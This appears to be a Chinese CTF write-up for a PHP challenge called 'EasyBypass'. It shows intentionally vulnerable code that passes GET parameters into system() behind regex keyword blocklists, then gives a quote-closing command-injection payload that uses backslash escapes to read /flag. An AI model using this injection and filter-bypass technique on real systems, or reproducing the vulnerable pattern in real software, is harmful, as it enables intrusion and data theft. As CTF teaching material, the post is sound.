---
title: EasyBypass
date: 2024-07-23 18:10:59
tags: 题解
categories: 刷题笔记
---

### EasyBypass

我们进行代码审计

```
<?php

highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];


if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
```

代码对comm1和comm2进行正则匹配，再执行命令

我们需要做的就是绕过正则匹配和执行想要的命令

<!--more-->

```
system($cmd);可看做system( "file $comm1 $comm2");
```

我们可以将引号进行闭合，执行我们想要的命令

因此payload

```
?comm1=index.php";ca\t+/f\lag"&comm2=1
```

得到flag

![image-20240723182132642](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407231821693.png)
